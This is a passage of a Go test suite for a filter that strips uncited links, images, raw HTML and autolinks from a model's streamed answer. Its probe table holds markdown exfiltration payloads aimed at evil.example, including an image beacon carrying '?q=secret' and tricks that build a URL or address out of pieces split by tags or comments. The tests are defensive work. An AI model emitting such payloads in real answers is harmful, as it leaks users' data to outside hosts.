package going

import (
	"errors"
	"regexp"
	"strconv"
	"strings"
	"testing"

	"github.com/sjawhar/envoy/internal/contracts"
)

// The two hits a test's citation set holds, and one target no citation set holds: the filter
// admits a link by its href alone, so the href is what each test names.
var (
	citedIssue   = Hit{Kind: "issue", ID: "INFRA-1279", Title: "Answer a question", Href: "/issues/INFRA-1279"}
	citedComment = Hit{Kind: "comment", ID: "7", Title: "Who owns the order", Href: "/issues/INFRA-1279#c7"}
)

const outsideHref = "/issues/INFRA-9999"

// stream is one filter and everything it emitted, so a test reads the stream as a reader does.
type stream struct {
	events []Event
	// failAt is the event the writer fails at, counted from one; zero never fails.
	failAt int
	fault  error
}

// emit is the stream's writer, which fails at failAt so a test can prove the filter stops there.
func (s *stream) emit(event Event) error {
	s.events = append(s.events, event)
	if s.failAt > 0 && len(s.events) == s.failAt {
		s.fault = errors.New("the stream's writer failed")
		return s.fault
	}
	return nil
}

// names is every event's name in the order it was emitted.
func (s *stream) names() []string {
	names := make([]string, len(s.events))
	for i, event := range s.events {
		names[i] = event.Name
	}
	return names
}

// tail is the last n event names, the order Close's own events are checked in.
func (s *stream) tail(n int) []string {
	names := s.names()
	if len(names) < n {
		return names
	}
	return names[len(names)-n:]
}

// text is the whole answer a reader saw, every text frame of it joined in order, which is what
// each rule of the filter is asserted over: a link the server would not pass on may be in no
// frame of it, and no two frames of it may meet in one.
func (s *stream) text() string {
	var out strings.Builder
	for _, event := range s.events {
		if event.Name == contracts.GoingEventText {
			out.WriteString(event.Data.(TextData).Text)
		}
	}
	return out.String()
}

// only is the one event named, and fails the test when the stream holds none or several.
func (s *stream) only(t *testing.T, name string) Event {
	t.Helper()
	var found []Event
	for _, event := range s.events {
		if event.Name == name {
			found = append(found, event)
		}
	}
	if len(found) != 1 {
		t.Fatalf("stream holds %d %s events, want exactly 1: %v", len(found), name, s.names())
	}
	return found[0]
}

// count is how many events of that name the stream holds.
func (s *stream) count(name string) int {
	total := 0
	for _, event := range s.events {
		if event.Name == name {
			total++
		}
	}
	return total
}

// dropped is how many pieces the changed event says the server did not pass on, and zero when
// the stream holds no changed event at all.
func (s *stream) dropped(t *testing.T) int {
	t.Helper()
	if s.count(contracts.GoingEventChanged) == 0 {
		return 0
	}
	return s.only(t, contracts.GoingEventChanged).Data.(ChangedData).Dropped
}

// terminal checks the one rule every run of the filter keeps: exactly one terminal event, last.
func (s *stream) terminal(t *testing.T) Event {
	t.Helper()
	var terminals []Event
	for _, event := range s.events {
		if event.Terminal() {
			terminals = append(terminals, event)
		}
	}
	if len(terminals) != 1 {
		t.Fatalf("stream holds %d terminal events, want exactly 1: %v", len(terminals), s.names())
	}
	if last := s.events[len(s.events)-1]; !last.Terminal() {
		t.Fatalf("stream ends with %s, want it to end with its terminal event: %v", last.Name, s.names())
	}
	return terminals[0]
}

// citationsOf is the citation set the run gave the model, keyed by href as the filter reads it.
func citationsOf(hits ...Hit) map[string]Hit {
	citations := make(map[string]Hit, len(hits))
	for _, hit := range hits {
		citations[hit.Href] = hit
	}
	return citations
}

// drive writes every delta to one filter and closes it, failing the test on an error the test
// did not ask for.
func drive(t *testing.T, citations map[string]Hit, deltas ...string) *stream {
	t.Helper()
	emitted := &stream{}
	filter := newAnswerFilter(citations, emitted.emit)
	for i, delta := range deltas {
		if err := filter.Write(delta); err != nil {
			t.Fatalf("Write(%d, %q): %v", i, delta, err)
		}
	}
	if err := filter.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}
	return emitted
}

// pieces cuts text into runs of size bytes, so a test drives the filter with deltas that fall on
// no boundary of a word or a link, as a real completion's frames do.
func pieces(text string, size int) []string {
	var out []string
	for len(text) > size {
		out = append(out, text[:size])
		text = text[size:]
	}
	if text != "" {
		out = append(out, text)
	}
	return out
}

// words is a reply of n words, each of them distinct, so a cut can be located in the answer.
func words(n int) string {
	var out strings.Builder
	for i := range n {
		if i > 0 {
			out.WriteByte(' ')
		}
		out.WriteString("word")
		out.WriteString(strings.Repeat("x", i%3))
	}
	return out.String()
}

// marked reports whether letter is one of the ASCII punctuation bytes a renderer may read as
// markdown, which is every one of them: CommonMark allows a backslash escape before each, and
// the contract is that the server writes that backslash. It is written out here rather than
// taken from the filter, so a test is a second opinion on the set and not a copy of one.
func marked(letter byte) bool {
	return strings.IndexByte("!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~", letter) >= 0
}

// escaped is the text frame a reader is owed for text: every ASCII punctuation byte of it behind
// a backslash, and every other byte as the model wrote it.
func escaped(text string) string {
	var out strings.Builder
	for i := range len(text) {
		if marked(text[i]) {
			out.WriteByte('\\')
		}
		out.WriteByte(text[i])
	}
	return out.String()
}

// plainText checks the contract of a text frame over the whole answer: every ASCII punctuation
// byte a reader is sent stands behind a backslash, which is what closes markdown's own
// constructs - no frame of the stream can become a link, an image, a tag or a code span, and no
// two frames can meet in one. It is not what keeps a literal autolink out, since a renderer
// decodes the escape before GFM looks for one: noAutolink checks that rule.
func plainText(t *testing.T, answer string) {
	t.Helper()
	for i := 0; i < len(answer); i++ {
		if answer[i] == '\\' {
			// The byte the backslash escapes, whatever it is, makes no markdown.
			i++
			continue
		}
		if marked(answer[i]) {
			t.Errorf("answer %q carries %q unescaped at byte %d, which a renderer may read as markdown",
				answer, answer[i:i+1], i)
			return
		}
	}
}

// beforeLinkify is what a renderer holds before it reads the text for markdown's own
// constructs: the character references decoded, and the raw HTML tags taken out of it, so
// whatever stood on either side of a tag meets. A backslash escape closes a construct and stops
// a reference, so an escaped byte is copied with its backslash and decodes to nothing. It
// closes no literal autolink, which a renderer finds in the text the escapes decode to: that is
// what decoded and noAutolink are for.
func beforeLinkify(text string) string {
	var out strings.Builder
	for i := 0; i < len(text); {
		switch {
		case text[i] == '\\' && i+1 < len(text):
			out.WriteString(text[i : i+2])
			i += 2
		case text[i] == '<':
			if end := strings.IndexByte(text[i:], '>'); end > 0 {
				i += end + 1
				continue
			}
			out.WriteByte(text[i])
			i++
		case text[i] == '&':
			if size, letter := characterReference(text[i:]); size > 0 {
				out.WriteRune(letter)
				i += size
				continue
			}
			out.WriteByte(text[i])
			i++
		default:
			out.WriteByte(text[i])
			i++
		}
	}
	return out.String()
}

// characterReference reads the numeric character reference text begins with - &#46; and &#x2e;
// alike - and answers its size in bytes and the character it decodes to, or zero when text
// begins with none.
func characterReference(text string) (int, rune) {
	end := strings.IndexByte(text, ';')
	if end < 3 || text[1] != '#' {
		return 0, 0
	}
	digits, base := text[2:end], 10
	if digits[0] == 'x' || digits[0] == 'X' {
		digits, base = digits[1:], 16
	}
	code, err := strconv.ParseInt(digits, base, 32)
	if err != nil {
		return 0, 0
	}
	return end + 1, rune(code)
}

// offers reports whether text holds the bytes a renderer needs to make shape a link or a fetch:
// the bytes as the model wrote them, or the bytes a renderer holds once it has decoded the
// references and taken the tags out - which is how two pieces of an answer meet in a link the
// server deleted nothing but the tag between them.
func offers(text, shape string) bool {
	return strings.Contains(text, shape) || strings.Contains(beforeLinkify(text), shape)
}

// autolinkMarks are the marks GFM links a word by with no markdown around it at all, and
// emailShape the address it links the same way: a local part, an @, and a host whose labels are
// made of [-\w] with a dot between them, which is how mdast-util-gfm-autolink-literal 2.0.1
// reads a host. Both are written out here rather than taken from the filter, so a test is a
// second opinion on the set and not a copy of one.
var (
	autolinkMarks = []string{"www.", "://", "mailto:", "xmpp:"}
	emailShape    = regexp.MustCompile(`[A-Za-z0-9._+-]+@[A-Za-z0-9_-]+\.[A-Za-z0-9_-]`)
)

// decoded is the text a renderer holds once it has decoded the character escapes the server
// wrote: a backslash and the byte after it are that byte alone. It is the text GFM's autolink
// extension reads, because remark decodes the escape before the extension looks at it, which is
// why the escape closes markdown's own constructs and closes none of its literal autolinks.
func decoded(text string) string {
	var out strings.Builder
	for i := 0; i < len(text); i++ {
		if text[i] == '\\' && i+1 < len(text) {
			i++
		}
		out.WriteByte(text[i])
	}
	return out.String()
}

// noAutolink checks the invariant a renderer reads: the whole answer, decoded as a renderer
// decodes it, carries no www. host, no scheme's ://, no mailto: or xmpp: and no address, so
// there is nothing in it for GFM to link with no markdown at all.
func noAutolink(t *testing.T, answer string) {
	t.Helper()
	text := decoded(answer)
	for _, mark := range autolinkMarks {
		if at := strings.Index(strings.ToLower(text), mark); at >= 0 {
			t.Errorf("the answer decodes to %q, which offers a renderer %q at byte %d: GFM links that with no markdown at all",
				text, mark, at)
		}
	}
	if address := emailShape.FindString(text); address != "" {
		t.Errorf("the answer decodes to %q, which offers a renderer the address %q: GFM links that with no markdown at all",
			text, address)
	}
}

// TestFilterEmitsWholeWordsAsTheyArrive: a reader is told the words of each delta as that delta
// arrives, so the answer still streams, and never the half of a word the delta ended in - that
// word is held until a space, or Close, completes it, which is what lets every word be judged
// before a reader sees it.
func TestFilterEmitsWholeWordsAsTheyArrive(t *testing.T) {
	deltas := []string{"Dispatch keeps ", "the broadcast or", "der on the issue."}
	seen := []string{
		"Dispatch keeps ",
		"Dispatch keeps the broadcast ",
		"Dispatch keeps the broadcast order on the ",
	}
	emitted := &stream{}
	filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
	for i, delta := range deltas {
		if err := filter.Write(delta); err != nil {
			t.Fatalf("Write(%d, %q): %v", i, delta, err)
		}
		if got := emitted.text(); got != escaped(seen[i]) {
			t.Errorf("after delta %d the reader has seen %q, want %q", i, got, escaped(seen[i]))
		}
	}
	if err := filter.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}
	if got, want := emitted.text(), escaped(strings.Join(deltas, "")); got != want {
		t.Errorf("answer = %q, want %q", got, want)
	}
	plainText(t, emitted.text())
	emitted.terminal(t)
}

// TestFilterCutsTheAnswerAtTheWordCap: a reply far past the cap is cut at
// contracts.GoingAnswerWordMax words, cut says so with that count, nothing after it is emitted,
// and end still follows - a cut answer is an answer.
func TestFilterCutsTheAnswerAtTheWordCap(t *testing.T) {
	emitted := drive(t, citationsOf(citedIssue), pieces(words(300), 7)...)
	if got := len(strings.Fields(emitted.text())); got != contracts.GoingAnswerWordMax {
		t.Errorf("answer carries %d words, want %d", got, contracts.GoingAnswerWordMax)
	}
	cut := emitted.only(t, contracts.GoingEventCut)
	if got := cut.Data.(CutData).Words; got != contracts.GoingAnswerWordMax {
		t.Errorf("cut words = %d, want %d", got, contracts.GoingAnswerWordMax)
	}
	for i, event := range emitted.events {
		if event.Name == contracts.GoingEventCut {
			for _, after := range emitted.events[i+1:] {
				if after.Name == contracts.GoingEventText {
					t.Errorf("a text event was emitted after the cut: %v", emitted.names())
				}
			}
			break
		}
	}
	if got := emitted.count(contracts.GoingEventNone); got != 0 {
		t.Errorf("stream holds %d none events, want none for an answer the cap cut: %v", got, emitted.names())
	}
	if got, want := emitted.names()[len(emitted.events)-1], contracts.GoingEventEnd; got != want {
		t.Errorf("stream ends with %s, want %s after a cut: %v", got, want, emitted.names())
	}
	if got := emitted.terminal(t).Data.(EndData).Words; got != contracts.GoingAnswerWordMax {
		t.Errorf("end words = %d, want %d", got, contracts.GoingAnswerWordMax)
	}
}

// TestFilterKeepsALinkInTheCitationSet: a link to a hit the model was given reaches the reader
// as its own visible text, escaped like every other byte of the answer, and as one item frame
// carrying that hit's href - the one place a link lives. The hit is named once however often
// the answer links it, and such a link is no change to report: the item carries it.
func TestFilterKeepsALinkInTheCitationSet(t *testing.T) {
	for _, tc := range []struct {
		name   string
		answer string
		want   string
		items  int
	}{
		{
			"linked once",
			"See [Answer a question](/issues/INFRA-1279) for the order.",
			escaped("See Answer a question for the order."),
			1,
		},
		{
			"the same item linked twice",
			"See [Answer a question](/issues/INFRA-1279) and [it again](/issues/INFRA-1279).",
			escaped("See Answer a question and it again."),
			1,
		},
		{
			"two items",
			"See [Answer a question](/issues/INFRA-1279) and [Who owns the order](/issues/INFRA-1279#c7).",
			escaped("See Answer a question and Who owns the order."),
			2,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			emitted := drive(t, citationsOf(citedIssue, citedComment), pieces(tc.answer, 5)...)
			got := emitted.text()
			if got != tc.want {
				t.Errorf("answer = %q, want %q", got, tc.want)
			}
			plainText(t, got)
			if strings.Contains(got, citedIssue.Href) {
				t.Errorf("answer %q carries the href itself, which only the item frame carries", got)
			}
			if items := emitted.count(contracts.GoingEventItem); items != tc.items {
				t.Errorf("stream holds %d item events, want %d: %v", items, tc.items, emitted.names())
			}
			for _, event := range emitted.events {
				if event.Name != contracts.GoingEventItem {
					continue
				}
				// An item frame's href is exactly a cited hit's own: it is the answer's link.
				if href := event.Data.(ItemData).Href; citationsOf(citedIssue, citedComment)[href].Href != href {
					t.Errorf("an item's href = %q, want a cited hit's own href", href)
				}
				break
			}
			if none := emitted.count(contracts.GoingEventNone); none != 0 {
				t.Errorf("stream holds %d none events, want none for an answer the model wrote", none)
			}
			if dropped := emitted.dropped(t); dropped != 0 {
				t.Errorf("changed dropped = %d, want none for a link the model was given", dropped)
			}
			end := emitted.terminal(t)
			if items := end.Data.(EndData).Items; items != tc.items {
				t.Errorf("end items = %d, want %d", items, tc.items)
			}
			if got, want := end.Data.(EndData).Words, len(strings.Fields(emitted.text())); got != want {
				t.Errorf("end words = %d, want %d", got, want)
			}
			if first := emitted.events[0]; first.Name != contracts.GoingEventText {
				t.Errorf("stream begins with %s, want the text before the link first", first.Name)
			}
		})
	}
}

// linkProbe is one form a renderer makes a link of: what the model wrote, the whole text of
// every frame the reader gets of it, the bytes a renderer would make the link or the fetch out
// of, and what the stream says became of it. The forms are declared here, once, because two
// tests read them - the one that checks each form's own text and counts, and the one that
// checks the invariant a renderer reads over every answer of the suite at once.
type linkProbe struct {
	name    string
	answer  string
	want    string
	linked  string
	dropped int
	items   int
}

var linkProbes = []linkProbe{
	{
		name:    "brackets inside the link text",
		answer:  "Read [[x]](//evil.example) now.",
		want:    escaped("Read [x] now."),
		linked:  "](//evil.example)",
		dropped: 1,
	},
	{
		name:    "balanced brackets around a word of the link text",
		answer:  "Read [a [b] c](//evil.example) now.",
		want:    escaped("Read a [b] c now."),
		linked:  "](//evil.example)",
		dropped: 1,
	},
	{
		name:    "a newline inside the link text",
		answer:  "Read [x\ny](//evil.example) now.",
		want:    escaped("Read [x\ny](//evil.example) now."),
		linked:  "](//evil.example)",
		dropped: 0,
	},
	{
		name:    "a code span inside the link text, which binds tighter than the brackets",
		answer:  "Read [x`](/issues/INFRA-1279)`](//evil.example) now.",
		want:    escaped("Read [x`](/issues/INFRA-1279)`](//evil.example) now."),
		linked:  "](//evil.example)",
		dropped: 0,
		items:   0,
	},
	{
		name:    "a definition inside a block quote, which gives the whole document a target",
		answer:  "> [r]: //evil.example\n\nSee [r] for it.",
		want:    escaped("> [r]: //evil.example\n\nSee [r] for it."),
		linked:  "[r]: //evil.example",
		dropped: 0,
	},
	{
		name:    "a www host that does not open the word it stands in",
		answer:  "Read (www.evil.example) now.",
		want:    escaped("Read ") + escaped(" now."),
		linked:  "www.evil.example",
		dropped: 1,
	},
	{
		name:    "an email address, which GFM links with no markdown at all",
		answer:  "Mail user@evil.example now.",
		want:    escaped("Mail ") + escaped(" now."),
		linked:  "user@evil.example",
		dropped: 1,
	},
	{
		name:    "a tag whose deletion would join a link out of its neighbours",
		answer:  "Read [a]<b>(//evil.example) now.",
		want:    escaped("Read [a](//evil.example) now."),
		linked:  "](//evil.example)",
		dropped: 1,
	},
	{
		// The tag stood between the scheme and the host, so the word a reader sees is the
		// one word https://evil.example: the filter judges that word, drops it whole, and
		// counts the tag it was built across as a drop of its own.
		name:    "a tag whose deletion would join a bare URL out of its neighbours",
		answer:  "Read https:<b>//evil.example now.",
		want:    escaped("Read ") + escaped(" now."),
		linked:  "https://",
		dropped: 2,
	},
	{
		name:    "a character reference that decodes to a www host",
		answer:  "Read www&#46;evil.example now.",
		want:    escaped("Read www&#46;evil.example now."),
		linked:  "www.evil.example",
		dropped: 0,
	},
	{
		name:    "a bare mailto address",
		answer:  "Mail mailto:ops@evil.example now.",
		want:    escaped("Mail ") + escaped(" now."),
		linked:  "mailto:ops@evil.example",
		dropped: 1,
	},
	{
		name:    "a bare xmpp address",
		answer:  "Say xmpp:romeo@montague.net now.",
		want:    escaped("Say ") + escaped(" now."),
		linked:  "xmpp:romeo@montague.net",
		dropped: 1,
	},
	{
		name:    "an inline link to a target the model was never given",
		answer:  "Read [some other issue](" + outsideHref + ") instead.",
		want:    escaped("Read some other issue instead."),
		linked:  "](" + outsideHref + ")",
		dropped: 1,
	},
	{
		name:    "an inline image, even of an item the model was given",
		answer:  "Look at ![the chart](/issues/INFRA-1279) now.",
		want:    escaped("Look at the chart now."),
		linked:  "](/issues/INFRA-1279)",
		dropped: 1,
	},
	{
		name:    "a reference link and the definition that gives it its target",
		answer:  "See [the order][r] for it.\n\n[r]: https://evil.example/x",
		want:    escaped("See the order for it.\n\n[r]: "),
		linked:  "https://evil.example/x",
		dropped: 2,
	},
	{
		name:    "a reference image, which a page fetches with no click",
		answer:  "![beacon][p]\n\n[p]: https://evil.example/pixel.png?q=secret",
		want:    escaped("beacon\n\n[p]: "),
		linked:  "https://evil.example/pixel.png",
		dropped: 2,
	},
	{
		name:    "a collapsed reference",
		answer:  "See [the order][] for it.",
		want:    escaped("See the order for it."),
		linked:  "[the order][]",
		dropped: 1,
	},
	{
		name:    "an autolink",
		answer:  "Read <https://evil.example/x> now.",
		want:    escaped("Read ") + escaped(" now."),
		linked:  "<https://evil.example/x>",
		dropped: 1,
	},
	{
		name:    "an email autolink",
		answer:  "Mail <ops@evil.example> now.",
		want:    escaped("Mail ") + escaped(" now."),
		linked:  "<ops@evil.example>",
		dropped: 1,
	},
	{
		name:    "a raw HTML image, which a page fetches with no click",
		answer:  `Read <img src="https://evil.example/pixel.png"> now.`,
		want:    escaped("Read ") + escaped(" now."),
		linked:  `<img src="https://evil.example/pixel.png">`,
		dropped: 1,
	},
	{
		name:    "a raw HTML tag and its closing tag",
		answer:  "Say <span title=\"x\">it</span> plainly.",
		want:    escaped("Say ") + escaped("it") + escaped(" plainly."),
		linked:  `<span title="x">`,
		dropped: 2,
	},
	{
		name:    "a bare URL, which a renderer links with no markdown at all",
		answer:  "Read https://evil.example/x now.",
		want:    escaped("Read ") + escaped(" now."),
		linked:  "https://evil.example/x",
		dropped: 1,
	},
	{
		name:    "a bare www host, in the case the model wrote it",
		answer:  "Read WWW.evil.example/x now.",
		want:    escaped("Read ") + escaped(" now."),
		linked:  "WWW.evil.example/x",
		dropped: 1,
	},
	{
		// The joins: what a reader sees of a word is the word the filter must judge,
		// however many pieces of the model's text the filter built that word out of.
		name:    "a tag whose deletion joins a www host out of its neighbours",
		answer:  "Read www<b>.evil.com now.",
		want:    escaped("Read ") + escaped(" now."),
		linked:  "www.evil.com",
		dropped: 2,
	},
	{
		name:    "a tag whose deletion joins an address out of its neighbours",
		answer:  "Mail user<b>@evil.com now.",
		want:    escaped("Mail ") + escaped(" now."),
		linked:  "user@evil.com",
		dropped: 2,
	},
	{
		// The model's own bytes carry no www. host; the text the server reduced the link
		// to, meeting what follows it, does. linked is therefore the piece that text runs
		// into, and the whole join is what the decoded answer may not carry.
		name:    "a link the server reduced, whose text joins a www host",
		answer:  "Read [ww](" + outsideHref + ")w.evil.com now.",
		want:    escaped("Read ") + escaped(" now."),
		linked:  "w.evil.com",
		dropped: 2,
	},
	{
		// The link was cited, so the item frame arrives even though the word was dropped:
		// it carries that hit's own href, and it is the one honest link such an answer has.
		name:    "a cited link the server reduced, whose text joins a www host",
		answer:  "Read [ww](/issues/INFRA-1279)w.evil.com now.",
		want:    escaped("Read ") + escaped(" now."),
		linked:  "w.evil.com",
		dropped: 1,
		items:   1,
	},
	{
		// GFM leaves the sentence's own full stop out of the link rather than refusing the
		// link, so a host is judged by its labels and not by the byte it trails off in.
		name:    "an address the sentence's own full stop follows",
		answer:  "Write to user@evil.com. Thanks",
		want:    escaped("Write to ") + escaped(" Thanks"),
		linked:  "user@evil.com",
		dropped: 1,
	},
	{
		// An image is dropped and its alt text is what a reader is left with, so the alt joins
		// what stood on the image's two sides exactly as a reduced link's text does. linked is
		// the piece the alt runs into, as it is for the reduced links above, since the model's
		// own bytes carry the host in no other form.
		name:    "an image the server dropped, whose alt text joins a www host",
		answer:  "Host ![ww](https://a.example/p.png)w.evil.com now.",
		want:    escaped("Host ") + escaped(" now."),
		linked:  "w.evil.com",
		dropped: 2,
	},
	{
		// The autolink is dropped whole, and the word its two sides make is the one a reader
		// would have linked; the tag cases above cover the same join through another drop.
		name:    "an autolink the server dropped, whose neighbours join a www host",
		answer:  "Host www<https://a.example>.evil.com now.",
		want:    escaped("Host ") + escaped(" now."),
		linked:  "www.evil.com",
		dropped: 2,
	},
	{
		// A comment renders as nothing at all, so the bytes on its two sides are adjacent to
		// a reader even before the server drops it.
		name:    "a comment the server dropped, whose neighbours join an address",
		answer:  "Mail user<!--x-->@evil.com now.",
		want:    escaped("Mail ") + escaped(" now."),
		linked:  "user@evil.com",
		dropped: 2,
	},
	{
		// GFM's host is labels of letters, digits, - and _ with a dot between them -
		// [-\w]+(?:\.[-\w]+)+ in mdast-util-gfm-autolink-literal 2.0.1 - so a label may
		// begin with a - or a _, and the address is one a reader can click all the same.
		name:    "an address whose host label begins with a -",
		answer:  "mail a@b.-c now",
		want:    escaped("mail ") + escaped(" now"),
		linked:  "a@b.-c",
		dropped: 1,
	},
	{
		name:    "an address whose host label begins with a - after a full label",
		answer:  "support@corp.-internal",
		want:    "",
		linked:  "support@corp.-internal",
		dropped: 1,
	},
	{
		name:    "an address whose host label begins with a _",
		answer:  "user@evil._x",
		want:    "",
		linked:  "user@evil._x",
		dropped: 1,
	},
	{
		name:    "a tag whose deletion joins a host label beginning with a -",
		answer:  "user@evil<b>.-com",
		want:    "",
		linked:  "user@evil.-com",
		dropped: 2,
	},
}

// TestFilterEmitsNoLinkInATextFrame: every form a renderer makes a link of, reduced to the text
// a reader sees of it or dropped, counted, and escaped. Each case carries the bytes a renderer
// needs for the link - linked - and the test checks both sides of the rule: the answer the model
// wrote offers those bytes, and the whole text of every frame the reader gets offers them in no
// form at all, decoded references and deleted tags included. Each case is driven at several
// delta sizes, since a form the model splits over frames is the same form.
func TestFilterEmitsNoLinkInATextFrame(t *testing.T) {
	for _, tc := range linkProbes {
		t.Run(tc.name, func(t *testing.T) {
			// The control: the form the model wrote really does offer a renderer the bytes of
			// the link, so what the rule below asserts is the rule's own doing.
			if !offers(tc.answer, tc.linked) {
				t.Fatalf("the model's own answer %q offers no %q: this case tests nothing", tc.answer, tc.linked)
			}
			for _, size := range []int{1, 4, 1000} {
				emitted := drive(t, citationsOf(citedIssue, citedComment), pieces(tc.answer, size)...)
				got := emitted.text()
				if got != tc.want {
					t.Errorf("deltas of %d bytes: answer = %q, want %q", size, got, tc.want)
				}
				plainText(t, got)
				if offers(got, tc.linked) {
					t.Errorf("deltas of %d bytes: the answer %q offers a renderer %q, which it may offer in no form",
						size, got, tc.linked)
				}
				if dropped := emitted.dropped(t); dropped != tc.dropped {
					t.Errorf("deltas of %d bytes: changed dropped = %d, want %d: %v", size, dropped, tc.dropped, emitted.names())
				}
				if items := emitted.count(contracts.GoingEventItem); items != tc.items {
					t.Errorf("deltas of %d bytes: stream holds %d item events, want %d: %v", size, items, tc.items, emitted.names())
				}
				emitted.terminal(t)
			}
		})
	}
}

// plainProbes are the shapes that are not links: a bracket no reference or definition follows,
// a < that opens no tag, a host with no scheme. They are declared here, once, for the test that
// keeps each rule above honest and for the one that reads the whole suite's invariant.
var plainProbes = []string{
	"The order is [not a link] here.",
	"The order is [not a link][ here.",
	"See [the order] for it, and [the order] again.",
	"Mind the ! and the [order] alike.",
	"The count is 3 < 5 and 7 > 2 here.",
	"It costs <3 of the budget.",
	"Read evil.example/x for it.",
	"Read www for it.",
	"The label order: is settled.",
	"Mind the <3 and the [brackets] alike.",
}

// suiteProbe is one probe of the whole suite: the name the suite knows it by, and the answer
// the model wrote. A plain probe has no name of its own and is named by its own text, as
// TestFilterKeepsTextThatOnlyLooksLikeALink names it.
type suiteProbe struct {
	name   string
	answer string
}

// allProbes is every probe the suite holds, the link forms and the plain shapes alike, in the
// order this file declares them. It is the one list of them: the invariant read over the whole
// suite and the golden the renderer's test reads are both built from it, so neither can miss a
// form the other has.
func allProbes() []suiteProbe {
	probes := make([]suiteProbe, 0, len(linkProbes)+len(plainProbes))
	for _, probe := range linkProbes {
		probes = append(probes, suiteProbe{name: probe.name, answer: probe.answer})
	}
	for _, answer := range plainProbes {
		probes = append(probes, suiteProbe{name: answer, answer: answer})
	}
	return probes
}

// TestFilterKeepsTextThatOnlyLooksLikeALink: the control for every form above. The same shapes
// that are not links are the answer's own words, and a reader is given every one of them,
// escaped as plain text, so each rule above drops a link and not the prose around it.
func TestFilterKeepsTextThatOnlyLooksLikeALink(t *testing.T) {
	for _, answer := range plainProbes {
		t.Run(answer, func(t *testing.T) {
			for _, size := range []int{1, 4, 1000} {
				emitted := drive(t, citationsOf(citedIssue), pieces(answer, size)...)
				if got := emitted.text(); got != escaped(answer) {
					t.Errorf("deltas of %d bytes: answer = %q, want the model's own words, %q", size, got, escaped(answer))
				}
				if dropped := emitted.dropped(t); dropped != 0 {
					t.Errorf("deltas of %d bytes: changed dropped = %d, want none: this is text, not a link", size, dropped)
				}
			}
		})
	}
}

// TestFilterOffersARendererNoAutolink: the invariant a renderer reads, over every probe of the
// suite at once. A character escape closes markdown's own constructs - a link, an image, a raw
// tag, a code span, a definition - but a renderer decodes it before GFM's autolink extension
// reads the text, so what that extension is given is the decoded answer, and the decoded answer
// of every probe may carry no www. host, no scheme's ://, no mailto: or xmpp: and no address.
func TestFilterOffersARendererNoAutolink(t *testing.T) {
	for _, probe := range allProbes() {
		t.Run(probe.answer, func(t *testing.T) {
			for _, size := range []int{1, 4, 1000} {
				emitted := drive(t, citationsOf(citedIssue, citedComment), pieces(probe.answer, size)...)
				noAutolink(t, emitted.text())
			}
		})
	}
}

// TestFilterSaysNoneOnlyWhenTheModelWroteNothing: none says the model produced no answer text at
// all - a run that spent its calls and wrote nothing - and says nothing about what became of
// that text. An answer the server reduced or dropped every word of is still an answer the model
// wrote: changed says what the server did, and end's items of 0 says it rests on no source.
func TestFilterSaysNoneOnlyWhenTheModelWroteNothing(t *testing.T) {
	for _, tc := range []struct {
		name   string
		deltas []string
		// text is the whole answer the reader is shown, and tail the events that close the
		// stream after it, however many text events the deltas came to.
		text string
		tail []string
	}{
		{
			name: "the model wrote nothing at all",
			tail: []string{contracts.GoingEventNone, contracts.GoingEventEnd},
		},
		{
			name:   "the model wrote only space",
			deltas: []string{" ", "\n"},
			text:   " \n",
			tail:   []string{contracts.GoingEventNone, contracts.GoingEventEnd},
		},
		{
			name:   "an answer that links nothing is an answer",
			deltas: []string{"Dispatch holds nothing about that."},
			text:   escaped("Dispatch holds nothing about that."),
			tail:   []string{contracts.GoingEventEnd},
		},
		{
			name:   "an answer whose link was reduced to its text is an answer",
			deltas: []string{"[some other issue](" + outsideHref + ")"},
			text:   escaped("some other issue"),
			tail:   []string{contracts.GoingEventChanged, contracts.GoingEventEnd},
		},
		{
			name:   "an answer the server dropped every word of is still text the model wrote",
			deltas: []string{"https://evil.example/x"},
			tail:   []string{contracts.GoingEventChanged, contracts.GoingEventEnd},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			emitted := drive(t, citationsOf(citedIssue), tc.deltas...)
			if got := emitted.text(); got != tc.text {
				t.Errorf("answer = %q, want %q", got, tc.text)
			}
			if got := emitted.tail(len(tc.tail)); strings.Join(got, ",") != strings.Join(tc.tail, ",") {
				t.Errorf("stream ends %v, want %v: %v", got, tc.tail, emitted.names())
			}
			for _, name := range emitted.names()[:len(emitted.events)-len(tc.tail)] {
				if name != contracts.GoingEventText {
					t.Errorf("stream holds a %s event before its tail, want cleared text alone: %v", name, emitted.names())
				}
			}
			if got := emitted.terminal(t).Data.(EndData).Items; got != 0 {
				t.Errorf("end items = %d, want 0", got)
			}
		})
	}
}

// TestFilterHoldsALinkSpanSplitAcrossDeltas: the span arrives in pieces no one of which is a
// link, and nothing of it is emitted until it closes - what reaches a reader before that is
// always the start of the answer it ends with, and never half a span.
func TestFilterHoldsALinkSpanSplitAcrossDeltas(t *testing.T) {
	for _, tc := range []struct {
		name   string
		deltas []string
		want   string
		items  int
	}{
		{
			"a kept link",
			[]string{"See ", "[Answ", "er a ques", "tion](/iss", "ues/INFRA-1279", ") now."},
			escaped("See Answer a question now."),
			1,
		},
		{
			"a link to a target the model was never given",
			[]string{"See ", "[some ", "other issue]", "(" + outsideHref, ") now."},
			escaped("See some other issue now."),
			0,
		},
		{
			"a dropped autolink",
			[]string{"See ", "<https:", "//evil.exa", "mple/x", "> now."},
			escaped("See ") + escaped(" now."),
			0,
		},
		{
			"one byte at a time",
			pieces("See [Answer a question](/issues/INFRA-1279) now.", 1),
			escaped("See Answer a question now."),
			1,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			emitted := &stream{}
			filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
			for i, delta := range tc.deltas {
				if err := filter.Write(delta); err != nil {
					t.Fatalf("Write(%d, %q): %v", i, delta, err)
				}
				held := emitted.text()
				// Everything emitted so far is the answer's own opening: a byte that is not
				// there is a byte the filter emitted before it knew whether to.
				if !strings.HasPrefix(tc.want, held) {
					t.Fatalf("after delta %d the answer is %q, want a start of %q", i, held, tc.want)
				}
				plainText(t, held)
			}
			if err := filter.Close(); err != nil {
				t.Fatalf("Close: %v", err)
			}
			if got := emitted.text(); got != tc.want {
				t.Errorf("answer = %q, want %q", got, tc.want)
			}
			if got := emitted.count(contracts.GoingEventItem); got != tc.items {
				t.Errorf("stream holds %d item events, want %d", got, tc.items)
			}
